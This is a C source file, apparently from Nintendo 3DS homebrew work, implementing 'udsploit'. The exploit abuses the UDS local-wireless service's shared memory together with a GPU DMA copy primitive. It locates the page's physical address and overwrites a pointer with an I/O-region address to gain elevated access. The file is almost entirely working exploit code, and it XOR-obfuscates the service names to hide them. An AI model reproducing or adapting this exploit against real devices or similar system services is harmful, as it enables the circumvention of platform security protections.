#ifdef UDSPLOIT
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>

#include "text.h"

#include "../../build/constants.h"

static Result UDS_InitializeWithVersion(Handle* handle, Handle sharedmem_handle, u32 sharedmem_size)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x001B0302;
	cmdbuf[1] = sharedmem_size;
	memset(&cmdbuf[2], 0x00, 0x28);
	cmdbuf[12] = 0x400;//version
	cmdbuf[13] = 0;
	cmdbuf[14] = sharedmem_handle;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Bind(Handle* handle, u32 BindNodeID, u32 input0, u8 data_channel, u16 NetworkNodeID)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x120100;
	cmdbuf[1] = BindNodeID;
	cmdbuf[2] = input0;
	cmdbuf[3] = data_channel;
	cmdbuf[4] = NetworkNodeID;

	Result ret=0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Unbind(Handle* handle, u32 BindNodeID)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x130040;
	cmdbuf[1] = BindNodeID;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

static Result UDS_Shutdown(Handle* handle)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x30000;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result NDM_EnterExclusiveState(Handle* handle, u32 state)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x10042;
	cmdbuf[1] = state;
	cmdbuf[2] = 0x20;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result NDM_LeaveExclusiveState(Handle* handle)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x20002;
	cmdbuf[1] = 0x20;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

// Result _linearAlloc(u32* linear_addr, u32 size)
// {
// 	return svc_controlMemory(linear_addr, 0, 0, size, 0x10003, 0x3);
// }

// Result _linearFree(u32 addr, u32 size)
// {
// 	return svc_controlMemory((u32*)&addr, (u32)addr, 0, size, 1, 0);
// }

Result _initSrv(Handle* srvHandle);
Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server);
void doGspwn(u32* src, u32* dst, u32 size);
Result GSP_FlushDCache(u32* addr, u32 size);
Result GSP_InvalidateDCache(u32* addr, u32 size);

// // la == linear address (output)
// Result allocHeapWithLa(u32 va, u32 size, u32* la)
// {
// 	Result ret = 0;
// 	u32 placeholder_addr = 0;
// 	u32 placeholder_size = 0;
// 	u32 linear_addr = 0;
// 	MemInfo minfo = {0};
// 	PageInfo pinfo = {0};

// 	// allocate linear buffer as big as target buffer
// 	// printf("allocate linear buffer as big as target buffer\n");
// 	ret = _linearAlloc(&linear_addr, size);
// 	if(ret) return ret;

// 	// figure out how much memory is available
// 	// printf("figure out how much memory is available\n");
// 	s64 tmp = 0;
// 	ret = svc_getSystemInfo(&tmp, 0, 1);
// 	if(ret) return ret;
// 	placeholder_size = *(u32*)0x1FF80040 - (u32)tmp;
// 	// printf("%08X\n", placeholder_size);

// 	// figure out va for placeholder
// 	placeholder_addr = 0x08000000;
// 	ret = svc_queryMemory(&minfo, &pinfo, 0x08000000);
// 	if(ret) return ret;
// 	placeholder_addr += minfo.size;

// 	// allocate placeholder to cover all free memory
// 	// printf("allocate placeholder to cover all free memory\n");
// 	ret = svc_controlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
// 	if(ret) return ret;

// 	// free linear block
// 	// printf("free linear block\n");
// 	ret = _linearFree(linear_addr, size);
// 	if(ret) return ret;

// 	// allocate regular heap to replace it: we know its PA
// 	// printf("allocate regular heap to replace it\n");
// 	ret = svc_controlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
// 	if(ret) return ret;

// 	// free placeholder memory
// 	// printf("free placeholder memory\n");
// 	ret = svc_controlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
// 	if(ret) return ret;

// 	if(la) *la = linear_addr;

// 	return 0;
// }

#define SEARCH_CONST0 0xdeadbabe
#define SEARCH_CONST1 0xdeaddad
#define SEARCH_CONST2 0xdeadface

// la == linear address (output)
Result findPageLinearAddress(u32* linear_buffer, u32* va, u32* la)
{
	const u32 stride = 0x00100000;

	u32 cursor;
	for(cursor = 0x30000000 + FIRM_APPMEMALLOC - stride; cursor > 0x30000000; cursor -= stride)
	{
		GSP_InvalidateDCache(linear_buffer, stride);

		doGspwn((void*)cursor, (void*)linear_buffer, stride);
		svc_sleepThread(10 * 1000 * 1000);

		int i;
		for(i = 0; i < stride; i += 0x1000)
		{
			u32* buf = &linear_buffer[(i + 0xff0) / 4];
			if(buf[0] == SEARCH_CONST0 && buf[1] == SEARCH_CONST1 && buf[2] == SEARCH_CONST2)
			{
				if(va) *va = buf[3];
				if(la) *la = cursor + i;
				return 0;
			}
		}
	}

	return -1;
}

Result initHeapSearch()
{
	MemInfo info = {0};
	PageInfo flags = {0};
	const u32 base = 0x08000000;

	Result ret = svc_queryMemory(&info, &flags, base);
	if(ret) return ret;

	int i;
	for(i = 0; i < info.size; i += 0x1000)
	{
		u32 va = base + i;
		u32* buf = (u32*)(va + 0xff0);

		buf[0] = SEARCH_CONST0;
		buf[1] = SEARCH_CONST1;
		buf[2] = SEARCH_CONST2;
		buf[3] = va;
	}

	return 0;
}

#define STRING_COOKIE (0xdeadbabefacecafell)

Result udsploit(u32* linear_buffer)
{
	Handle udsHandle = 0;
	Handle ndmHandle = 0;
	Handle srvHandle = 0;
	Result ret = 0;

	const u32 sharedmem_size = 0x1000;
	Handle sharedmem_handle = 0;
	u32 sharedmem_va = 0, sharedmem_la = 0;
	
	ret = _initSrv(&srvHandle);
	if(ret) return ret;

	// let's see nintendo reverse engineer THIS insane obfuscation!!!
	volatile u64 nwmUdsString[] = {0x5344553a3a6d776ell ^ STRING_COOKIE, 0};
	volatile u64 ndmUString[] = {0x753a6d646ell ^ STRING_COOKIE};

	// printf("udsploit: srvGetServiceHandle\n");
	nwmUdsString[0] ^= STRING_COOKIE;
	ret = _srv_getServiceHandle(&srvHandle, &udsHandle, nwmUdsString);
	if(ret) goto fail;

	// printf("udsploit: srvGetServiceHandle\n");
	ndmUString[0] ^= STRING_COOKIE;
	ret = _srv_getServiceHandle(&srvHandle, &ndmHandle, ndmUString);
	if(ret) goto fail;

	{
		// initialize sharedmem page with a recognizable pattern
		initHeapSearch();

		// printf("udsploit: allocHeapWithPa\n");
		// ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
		ret = findPageLinearAddress(linear_buffer, &sharedmem_va, &sharedmem_la);
		if(ret)
		{
			sharedmem_va = 0;
			goto fail;
		}

		// drawHex(sharedmem_va, 8, 70);
		// drawHex(sharedmem_la, 8, 80);

		// printf("udsploit: sharedmem_la %08X\n", sharedmem_la);

		// printf("udsploit: svcCreateMemoryBlock\n");
		memset((void*)sharedmem_va, 0, sharedmem_size);
		ret = svc_createMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, 3);
		if(ret) goto fail;
	}

	// printf("udsploit: NDM_EnterExclusiveState\n");
	ret = NDM_EnterExclusiveState(&ndmHandle, 2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
	if(ret) goto fail;

	// printf("udsploit: UDS_InitializeWithVersion\n");
	ret = UDS_InitializeWithVersion(&udsHandle, sharedmem_handle, sharedmem_size);
	if(ret) goto fail;

	// printf("udsploit: NDM_LeaveExclusiveState\n");
	ret = NDM_LeaveExclusiveState(&ndmHandle);
	if(ret) goto fail;

	// printf("udsploit: UDS_Bind\n");
	u32 BindNodeID = 1;
	ret = UDS_Bind(&udsHandle, BindNodeID, 0xFF0, 1, 0);
	if(ret) goto fail;

	{
		u32* buffer = linear_buffer;

		GSP_InvalidateDCache(buffer, sharedmem_size);

		svc_sleepThread(1 * 1000 * 1000);
		doGspwn((u32*)sharedmem_la, buffer, sharedmem_size);
		svc_sleepThread(1 * 1000 * 1000);

		if(!buffer[0])
		{
			ret = -134;
			goto fail;
		}

		// int i;
		// for(i = 0; i < 8; i++)
		// {
		// 	drawHex(buffer[i * 4 + 0], 80, 40 + i * 10);
		// 	drawHex(buffer[i * 4 + 1], 80 + 70 * 1, 40 + i * 10);
		// 	drawHex(buffer[i * 4 + 2], 80 + 70 * 2, 40 + i * 10);
		// 	drawHex(buffer[i * 4 + 3], 80 + 70 * 3, 40 + i * 10);
		// }
					
		buffer[3] = 0x1EC40140 - 8;

		GSP_FlushDCache(buffer, sharedmem_size);
		doGspwn(buffer, (u32*)sharedmem_la, sharedmem_size);
		svc_sleepThread(1 * 1000 * 1000);
	}

	// printf("udsploit: UDS_Unbind\n");
	ret = UDS_Unbind(&udsHandle, BindNodeID);
	if(ret) goto fail;

	fail:
	if(udsHandle) UDS_Shutdown(&udsHandle);
	if(ndmHandle) svc_closeHandle(ndmHandle);
	if(udsHandle) svc_closeHandle(udsHandle);
	if(sharedmem_handle) svc_closeHandle(sharedmem_handle);
	// if(sharedmem_va) svc_controlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0);
	return ret;
}
#endif
